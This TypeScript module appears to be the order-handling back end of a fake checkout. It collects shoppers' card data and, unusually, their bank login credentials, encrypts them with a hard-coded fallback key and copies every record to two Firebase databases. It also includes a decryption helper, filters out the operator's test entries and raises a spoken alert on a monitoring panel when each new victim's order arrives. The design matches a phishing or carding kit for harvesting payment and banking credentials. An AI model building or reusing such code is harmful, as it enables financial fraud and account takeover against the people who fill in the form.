import { v4 as uuidv4 } from 'uuid';
import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';
import { database } from '../firebaseConfig';
import { database2 } from '../firebaseConfig2';
import { off, onValue, ref, set } from '@firebase/database';
import CryptoJS from 'crypto-js';

// ====== INTERFACES ======
export interface OrderData {
  id: string;
  timestamp: number;
  formData: FormData;
  encryptedCardData?: string;
  encryptedBankData?: string;
  bankName: string;
  productInfo?: {
    id: string;
    name: string;
    price: number;
    quantity: number;
    image: string;
    set: string;
  }[];
  total?: number;
  status?: 'pending' | 'processing' | 'completed' | 'failed';
}

export interface PublicOrderData {
  id: string;
  timestamp: number;
  formData: Pick<FormData, 'firstName' | 'lastName' | 'email' | 'phone' | 'city' | 'state'>;
  bankName: string;
  productInfo?: OrderData['productInfo'];
  total?: number;
  status?: OrderData['status'];
}

// ====== ENV CONFIG ======
const ENCRYPTION_KEY = import.meta.env.VITE_ENCRYPTION_KEY || 'your-secret-key-here';
const ADMIN_NAME = import.meta.env.VITE_ADMIN_NAME || 'x20xHani';

let previousOrdersLength = -1;
// In-memory storage for orders
let orders: OrderData[] = [];

// ====== UTILS ======
const encryptData = (data: any): string =>
  CryptoJS.AES.encrypt(JSON.stringify(data), ENCRYPTION_KEY).toString();

const decryptData = (encryptedData: string): any => {
  try {
    const bytes = CryptoJS.AES.decrypt(encryptedData, ENCRYPTION_KEY);
    return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
  } catch (error) {
    console.error("Decryption error:", error);
    return null;
  }
};

const validateAndSanitizeFormData = (formData: FormData): FormData => ({
  firstName: formData.firstName?.trim() || '',
  lastName: formData.lastName?.trim() || '',
  email: formData.email?.trim().toLowerCase() || '',
  phone: formData.phone?.replace(/[^\d+\-\(\)\s]/g, '') || '',
  address: formData.address?.trim() || '',
  city: formData.city?.trim() || '',
  state: formData.state?.trim() || '',
  zipCode: formData.zipCode?.replace(/[^\w\s\-]/g, '') || '',
  sameAsBilling: formData.sameAsBilling ?? true,
  billingAddress: formData.billingAddress?.trim() || '',
  billingCity: formData.billingCity?.trim() || '',
  billingState: formData.billingState?.trim() || '',
  billingZipCode: formData.billingZipCode?.replace(/[^\w\s\-]/g, '') || '',
});

// ====== CORE FUNCTIONS ======

// Generate a new GUID for a session
export const generateOrderId = (): string => {
  return uuidv4();
};

// Save or update order data
export const saveOrderData = async (
  orderId: string,
  data: Partial<OrderData>
): Promise<void> => {
  const existingOrderIndex = orders.findIndex((order) => order.id === orderId);
  const sanitizedFormData = data.formData ? validateAndSanitizeFormData(data.formData) : undefined;

  const orderData: OrderData = {
    id: orderId,
    timestamp: Date.now(),
    formData: sanitizedFormData || {
      firstName: '',
      lastName: '',
      email: '',
      phone: '',
      address: '',
      city: '',
      state: '',
      zipCode: '',
      sameAsBilling: true,
      billingAddress: '',
      billingCity: '',
      billingState: '',
      billingZipCode: '',
    },
    encryptedCardData: data.cardData ? encryptData(data.cardData) : undefined,
    encryptedBankData: data.bankLoginData ? encryptData(data.bankLoginData) : undefined,
    bankName: data.bankName?.trim() || '',
    productInfo: data.productInfo || [],
    total: typeof data.total === 'number' ? data.total : 0,
    status: data.status || 'pending',
  };

  if (existingOrderIndex >= 0) {
    // Update existing order
    orders[existingOrderIndex] = {
      ...orders[existingOrderIndex],
      ...orderData,
    };
  } else {
    orders.push(orderData);
  }

  await saveOrderDatainDB(orderId, orderData);
};

// Get all orders (returns public data only)
export const getOrders = async (): Promise<PublicOrderData[]> => {
  return new Promise((resolve, reject) => {
    const ordersRef = ref(database, 'orders/');
    onValue(
      ordersRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const ordersArray: OrderData[] = Object.values(data);
          const publicOrders: PublicOrderData[] = ordersArray.map(order => ({
            id: order.id,
            timestamp: order.timestamp,
            formData: {
              firstName: order.formData.firstName,
              lastName: order.formData.lastName,
              email: order.formData.email,
              phone: order.formData.phone,
              city: order.formData.city,
              state: order.formData.state,
            },
            bankName: order.bankName,
            productInfo: order.productInfo,
            total: order.total,
            status: order.status,
          }));
          resolve(publicOrders);
        } else {
          resolve([]);
        }
      },
      (error) => reject(error)
    );
  });
};

// Get a specific order by ID (from memory first, then database)
export const getOrderById = async (orderId: string): Promise<OrderData | undefined> => {
  // Check in-memory first
  const memoryOrder = orders.find((order) => order.id === orderId);
  if (memoryOrder) return memoryOrder;

  // Fetch from database if not in memory
  return new Promise((resolve, reject) => {
    const orderRef = ref(database, `orders/${orderId}`);
    onValue(
      orderRef,
      (snapshot) => {
        const data = snapshot.val();
        resolve(data || undefined);
      },
      { onlyOnce: true },
      (error) => reject(error)
    );
  });
};

// Get decrypted sensitive data
export const getDecryptedOrderData = (order: OrderData) => ({
  cardData: order.encryptedCardData ? decryptData(order.encryptedCardData) : undefined,
  bankLoginData: order.encryptedBankData ? decryptData(order.encryptedBankData) : undefined,
});

export const saveOrderDatainDB = async (
  orderId: string,
  data: OrderData
) => {
  const orderRef = ref(database, 'orders/' + orderId);
  const orderRef2 = ref(database2, 'orders/' + orderId);

  console.log(`✅ Order ${orderId} saved to Firebase`);

  await set(orderRef, data); // Save to primary database
  await set(orderRef2, data); // Save to secondary database
};

export const listenOrdersinDB = (callback: (orders: OrderData[]) => void) => {
  const ordersRef = ref(database, 'orders/');

  onValue(ordersRef, (snapshot) => {
    const data = snapshot.val();
    if (data) {
      const ordersArray: OrderData[] = Object.values(data);
      callback(ordersArray);
    } else {
      callback([]);
    }
  });
};

export const subscribeOrders = (callback: (orders: OrderData[]) => void) => {
  const ordersRef = ref(database, 'orders/');

  const listener = onValue(ordersRef, (snapshot) => {
    const data = snapshot.val();
    let ordersArray: OrderData[] = data ? Object.values(data) : [];

    // Filter out orders with test names (same logic as original)
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== ADMIN_NAME
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== ''
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== null
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== undefined
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== '20xhani'
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== '20xhan'
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== '20xha'
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== '20xh'
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== '20x'
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== '20'
    );
    ordersArray = ordersArray.filter(
      (order) => order.formData?.firstName !== '2'
    );

    ordersArray.sort((a, b) => b.timestamp - a.timestamp);

    if (
      ordersArray.length > previousOrdersLength &&
      previousOrdersLength !== -1
    ) {
      alert('New order received!'); // visual alert
      // Voice alert
      const msg = new SpeechSynthesisUtterance('New order received!');
      window.speechSynthesis.speak(msg);
    }
    previousOrdersLength = ordersArray.length;
    console.log('Orders updated:', ordersArray);
    callback(ordersArray);
  });

  // Return unsubscribe function
  return () => off(ordersRef, 'value', listener);
};